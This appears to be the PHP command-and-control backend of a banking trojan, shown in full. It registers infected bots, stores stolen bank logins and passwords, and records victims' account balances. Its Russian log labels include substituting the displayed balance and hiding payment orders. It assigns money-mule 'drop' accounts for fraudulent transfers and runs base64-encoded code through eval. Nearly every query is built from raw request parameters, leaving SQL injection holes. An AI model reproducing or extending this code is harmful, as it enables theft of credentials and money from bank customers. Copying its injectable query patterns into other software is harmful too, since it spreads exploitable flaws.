<?php

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

error_reporting(0);
ini_set('error_reporting', -1);
header("Pragma: no-cache");
header("Expires: 0");

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.get_config.php');
include_once($dir . 'includes/functions.numformat.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();
$mysqli->settings["debug"] = true;

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);
$mysqli->settings["debug"] = true;
if(!empty($_GET['uid'])) $uid = $_GET['uid'];
if(!empty($_GET['sys'])) $sys = $_GET['sys'];
if(!empty($_GET['mode'])) $mode = $_GET['mode'];
if(!empty($_GET['cid'])) $userid = $_GET['cid'];
if(!empty($_GET['city'])) $city = $_GET['city'];
if(empty($city)) $city = 'unknow';
//if(!preg_match('~^([a-zA-Z0-9_]+)$~is', $city)) $city = 'unknow';

if(function_exists('mb_strtolower')){
    $city = mb_strtolower($city, 'UTF8');
}else{
    $city = strtolower($city);
}

if(empty($uid)){
	print_data('BOT_ERROR!', true);
}else{
	$matches = explode('0', $uid, 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}else{
		print_data('BOT_ERROR!', true);
	}
}

if(empty($sys)) print_data('SYS_ERROR!', true);
if(empty($mode)) print_data('MODE_ERROR!', true);

if(empty($userid)){
	if(file_exists($dir . 'cache/clients.json')){
		$clients = @json_decode(@file_get_contents($dir . 'cache/clients.json'), true);
		if(is_array($clients) && $clients[$prefix]){
			$userid = $clients[$prefix];
		}
	}
}

$system = $mysqli->query('SELECT id, nid, percent, `format` FROM bf_systems WHERE (`nid` = \''.$sys.'\') LIMIT 1');
if($system->nid != $sys) print_data('SYS_NOTFOUND!', true);

$id = $mysqli->query("INSERT INTO bf_bots set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', city='".$city."', system='".$system->nid."', last_date = CURRENT_TIMESTAMP() on duplicate key update last_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");

if(!empty($id)){
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`id` = \''.$id.'\') LIMIT 1');
}else{
	$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\') LIMIT 1');
}

if($city != 'unknow' && $bot->city != $city){
	$mysqli->query('update bf_bots set city = \''.$city.'\' WHERE (id = \''.$bot->id.'\')');
	$bot->city = $city;
}

if($bot->prefix != $prefix && $bot->uid != $uid) print_data('BOT_FERROR!', true);

function compare($a, $b){
   if ($a['sum'] == $b['sum']) return 0;
   return ($a['sum'] < $b['sum'])?-1:1;
}

switch($mode){
    case 'balance':
        if(!empty($_GET['acc'])){
            $acc = clearNumFormat($_GET['acc']);
            if(!preg_match('~^([0-9]+)$~is', $acc)) $acc = '';
        }else{
            $acc = '';
        }

        if(!empty($_GET['sum'])){
            $sum = $_GET['sum'];
        }else{
            print_data('SUMM_ERROR!', true);
        }

        $mysqli->query("INSERT INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc."', system='".$system->nid."', balance='".$sum."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
        //echo "INSERT INTO bf_balance set prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc."', system='".$system->nid."', balance='".$sum."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'";
	
	if(!empty($_GET['text'])){
            $bot->info = json_decode(base64_decode($bot->info), 1);
	    
	    
	    $_GET['text'] = explode(',', $_GET['text']);
	    if(count($_GET['text']) > 0){
		foreach($_GET['text'] as $txt){
		    $txt = explode('|', $txt);
		    if(isset($_GET['w'])) $txt[1] = mb_convert_encoding($txt[1], 'UTF-8', 'WINDOWS-1251');
		    $bot->info['text'][$txt[0]] = $txt[1];
		}
		$mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
	    }
        }
    break;

    case 'getbalance':
        if(!empty($_GET['acc'])){
            $acc = clearNumFormat($_GET['acc']);
            if(!preg_match('~^([0-9]+)$~is', $acc)) $acc = '';
        }

        if(!empty($acc)){
            $balance = $mysqli->query('SELECT * FROM bf_balance WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`acc` = \''.$acc.'\') AND (`system` = \''.$system->nid.'\') LIMIT 1');
            print($balance->balance);
        }
    break;

    case 'balances':
        if(empty($_GET['accs'])) print_data('ACCS_ERROR!', true);

        $accs = explode(';', $_GET['accs']);
        if(count($accs) > 0){
            foreach($accs as $item){
                $acc = explode(':', $item, 2);
                if(!empty($acc[0]) && !empty($acc[1])){
                    $mysqli->query("INSERT DELAYED INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc[0]."', system='".$system->nid."', balance='".$acc[1]."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
                }
            }
        }
    break;

    case 'getbalances':
        $balance = $mysqli->query('SELECT * FROM bf_balance WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\')', null, null, false);
	if(isset($balance[0])){
            foreach($balance as $item){
                print($item->acc . ':' . $item->balance . ';');
            }
        }
    break;

    case 'sethlog':
	if(empty($_GET['receiver'])) print_data('receiver_ERROR!', true);
	if(empty($_GET['sum'])) print_data('sum_ERROR!', true);
	if(empty($_GET['date'])) print_data('date_ERROR!', true);
	if(empty($_GET['note'])) print_data('note_ERROR!', true);
	
	$_GET['receiver'] = str_replace("'", '', $_GET['receiver']);
	$_GET['sum'] = str_replace("'", '', $_GET['sum']);
	$_GET['date'] = str_replace("'", '', $_GET['date']);
	$_GET['note'] = str_replace("'", '', $_GET['note']);
	
	if($mysqli->query('INSERT INTO bf_logs_history (`prefix`, `uid`, `receiver`, `sum`, `note`, `date`, `system`, `userid`) VALUES (\''.$prefix.'\', \''.$uid.'\', \''.$_GET['receiver'].'\', \''.$_GET['sum'].'\', \''.$_GET['note'].'\', \''.$_GET['date'].'\', \''.$system->nid.'\', \''.$userid.'\')')){
            print(1);
        }else{
            print(0);
        }
    break;

    case 'setlog':
	if(empty($_GET['log'])) print_data('LOG_ERROR!', true);
	if(empty($_GET['text'])) print_data('TEXT_ERROR!', true);
	//if(!preg_match('~^([a-zA-Zа-яА-Я0-9:.,_]+)$~', $_GET['text'])) print_data('TEXT_ERROR!', true);
	$_GET['text'] = mb_convert_encoding($_GET['text'], 'UTF-8', 'cp1251');
	$_GET['text'] = $mysqli->real_escape_string($_GET['text']);

	switch($_GET['log']){
		case '1':
			$log = 'сумма перевода';
		break;
	
		case '2':
			$log = 'отображение дропа от данного';
		break;
	
		case '3':
			$log = 'залив удачно проведён';
		break;
	
		case '4':
			$log = 'не получил дропа';
		break;
	
		case '5':
			$log = 'подменяю баланс (юзер)';
		break;
	
		case '6':
			$log = 'скрываю платёжку';
		break;
	
		case '7':
			$log = 'отчёт юзер делает';
		break;
	
		default:
			$log = false;
		break;
	}
	
	if(!empty($_GET['text'])){
	    if($log != false){
		$log = $log . ' - ' . $_GET['text'];
	    }else{
		$log = $_GET['text'];
	    }
	}
	
        if($log != false){
		if($mysqli->query('INSERT INTO bf_logs (`userid`, `prefix`, `uid`, `ip`, `version`, `log`, `system`) VALUES (\''.$userid.'\', \''.$bot->prefix.'\', \''.$bot->uid.'\', \''.$_SERVER['REMOTE_ADDR'].'\', \''.$bot->version.'\', \''.$log.'\', \''.$system->nid.'\')')){
			print(1);
		}else{
			print(0);
		}
	}else{
		print(0);
	}
    break;

    case 'setlp':	
        if(!empty($_GET['l'])){
            $login = $_GET['l'];
        }else{
            print_data('L_ERROR!', true);
        }
	
	if(!empty($_GET['p'])){
            $pass1 = $_GET['p'];
        }else{
            print_data('P_ERROR!', true);
        }
	
	if(!empty($_GET['p2'])){
            $pass2 = $_GET['p2'];
        }
	
	$bot->info = json_decode(base64_decode($bot->info), 1);
	
	$bot->info['login'] = $login;
	$bot->info['pass1'] = $pass1;
	if(!empty($pass2)) $bot->info['pass2'] = $pass2;
	
	$mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
    break;

    case 'getdrop':
	if(!empty($_GET['acc'])){
            $acc = clearNumFormat($_GET['acc']);
            if(!preg_match('~^([0-9]+)$~is', $acc)) $acc = '';
        }else{
            $acc = '';
        }
	
        if(!empty($_GET['sum'])){
            $sum = $_GET['sum'];
        }else{
            print_data('SUMM_ERROR!', true);
        }
	
	$bot->info = json_decode(base64_decode($bot->info), 1);
	if(@$bot->info['getdrop'] == true){
		print(false);
		exit;
	}
	
	if(!empty($bot->info['system_percent'])){
	    $system->percent = $bot->info['system_percent'];
	}
    
        $mysqli->query("INSERT INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc."', system='".$system->nid."', balance='".$sum."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
	
        //$system->sum = number_format((($sum*$system->percent)/100), 2, '.', '');
	$system->sum = floor(($sum*$system->percent)/100);
	$system->sum = number_format($system->sum, 2, '.', '');
	
	if(empty($bot->info['note'])){
		$note = 0;
	}else{
		$note = 1;
	}
	
	$userid_sql = '';
	if(!empty($userid)) $userid_sql = '((userid = \''.$userid.'\') OR (userid = \'\')) AND ';
	
	$drop = $mysqli->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$bot->city.'\') AND (`check_note` = \''.$note.'\') AND ('.$system->sum.' > `from`) AND ('.$system->sum.' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
	
	if(empty($drop->id) && empty($drop->system)){
		$drop = $mysqli->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$bot->city.'\') AND (`check_note` = \''.$note.'\') AND (\''.$sum.'\' < `max`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
		if(!empty($drop->id) && !empty($drop->system)){
			if($drop->to <= $system->sum){
				$system->sum = $drop->to;
			}else{
				unset($drop);
				$drop = false;
			}
		}else{
			$drop = false;
		}
	}
	
	if(empty($drop->id) && empty($drop->system)){
		$drop = $mysqli->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND ('.$system->sum.' > `from`) AND ('.$system->sum.' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
	}
	
	if(empty($drop->id) && empty($drop->system)){
		$drop = $mysqli->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND (\''.$sum.'\' < `max`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
		if(!empty($drop->id) && !empty($drop->system)){
			if($drop->to <= $system->sum){
				$system->sum = $drop->to;
			}else{
				unset($drop);
				$drop = false;
			}
		}else{
			$drop = false;
		}
	}
	
	if(!empty($drop->id) && !empty($drop->system)){
            if(!empty($system->format)){
                $drop->other = array_map('base64_decode', json_decode($drop->other, true));
		
		if($drop->other['round'] == '1') $system->sum = floor((($sum*$system->percent)/100)/1000)*1000;
		
                if($drop->vat != '0') $system->vat = number_format(($system->sum*$drop->vat)/100, 2, '.', '');
		
                if($drop->other['test'] != 1){
                    $mysqli->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
                }else{
                    $mysqli->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
                }
		
                $post_date = date('Y-m-d H:i:s');
                $format = $system->format;
                unset($system->format);
		
		if(!empty($bot->info['note'])){
		    $drop->destination = $bot->info['note'];
		}
		
                $mysqli->query("INSERT INTO bf_transfers (userid, prefix, uid, ip, acc, balance, `num`, `to`, system, status, info, drop_id, post_date) VALUES ('".$userid."', '".$bot->prefix."', '".$bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$acc."', '".$sum."', '".$system->sum."', '".$drop->acc."', '".$system->nid."', '2', '".base64_encode(json_encode(array('system' => $system, 'drop' => $drop)))."', '".$drop->id."', '".$post_date."')");
                $bot->info['getdrop'] = true;
		$mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
		
		eval(base64_decode($format));
            }
        }
    break;

    case 'getdrops':
	if(empty($_GET['accs'])) print_data('ACCS_ERROR!', true);
	
	$bot->info = json_decode(base64_decode($bot->info), 1);
	if(@$bot->info['getdrop'] == true){
		print(false);
		exit;
	}
	
	$getdrop = array();
	
	if(empty($bot->info['note'])){
		$note = 0;
	}else{
		$note = 1;
	}
	
	if(!empty($bot->info['system_percent'])){
	    $system->percent = $bot->info['system_percent'];
	}

        if(!empty($system->format)){
            $accs = explode(';', $_GET['accs']);
            if(count($accs) > 0){
                foreach($accs as $item){
                    $acc = explode(':', $item, 2);
                    if(!preg_match('~^([0-9]+)$~is', $acc[0])) $acc = '';
                    if(!empty($acc[0]) && !empty($acc[1])){
                        //$sum = number_format((($acc[1]*$system->percent)/100), 2, '.', '');
			$sum = floor(($acc[1]*$system->percent)/100);

                        //$drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND ('.$sum.' > `from`) AND ('.$sum.' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
			$drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$bot->city.'\') AND (`check_note` = \''.$note.'\') AND ('.$sum.' > `from`) AND ('.$sum.' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
                        
			if(empty($drop->id) && empty($drop->system)){
				$drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$bot->city.'\') AND (`check_note` = \''.$note.'\') AND (\''.$acc[1].'\' < `max`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
				if(!empty($drop->id) && !empty($drop->system)){
					if($drop->to <= $system->sum){
						$system->sum = $drop->to;
					}else{
						unset($drop);
						$drop = false;
					}
				}else{
					$drop = false;
				}
			}
			
			if(!empty($drop->id) && !empty($drop->system)){
				$drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND ('.$sum.' > `from`) AND ('.$sum.' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
			}
			
			if(empty($drop->id) && empty($drop->system)){
				$drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND (\''.$acc[1].'\' < `max`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
				if(!empty($drop->id) && !empty($drop->system)){
					if($drop->to <= $system->sum){
						$system->sum = $drop->to;
					}else{
						unset($drop);
						$drop = false;
					}
				}else{
					$drop = false;
				}
			}
			
			if(!empty($drop->id) && !empty($drop->system)){
				$getdrop[] = array('acc' => $acc[0], 'bal' => $acc[1], 'sum' => $sum, 'drop' => $drop);
                        }

                        $mysqli->query("INSERT DELAYED INTO bf_balance set userid = '".$userid."', prefix = '".$prefix."', uid = '".$uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc[0]."', system='".$system->nid."', balance='".$acc[1]."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
                    }
                }
            }

            usort($getdrop, 'compare');
	    
	    if(count($getdrop) > 0){
		@$getdrop = $getdrop[count($getdrop)-1];
		
		$drop = $getdrop['drop'];
		$_GET['acc'] = $getdrop['acc'];
		$system->sum = $getdrop['sum'];
    
		$drop->other = array_map('base64_decode', json_decode($drop->other, true));
		if($drop->other['round'] == '1') $system->sum = floor((($sum*$system->percent)/100)/1000)*1000;
		
		$system->sum = number_format($system->sum, 2, '.', '');
		
		if($drop->vat != '0') $system->vat = number_format(($system->sum*$drop->vat)/100, 2, '.', '');
    
		if($system->sum > 0){
			if($drop->other['test'] != 1){
			    $mysqli->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
			}else{
			    $mysqli->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
			}
	    
			$post_date = date('Y-m-d H:i:s');
			$format = $system->format;
			unset($system->format);
			
			if(!empty($bot->info['note'])){
				$drop->destination = $bot->info['note'];
			}
			
			$mysqli->query("INSERT INTO bf_transfers (userid, prefix, uid, ip, acc, balance, `num`, `to`, system, status, info, drop_id, post_date) VALUES ('".$userid."', '".$bot->prefix."', '".$bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$acc."', '".$sum."', '".$system->sum."', '".$drop->acc."', '".$system->nid."', '2', '".base64_encode(json_encode(array('system' => $system, 'drop' => $drop)))."', '".$drop->id."', '".$post_date."')");
			$bot->info['getdrop'] = true;
			$mysqli->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
			
			eval(base64_decode($format));
		}
	    }
        }
    break;
}

?>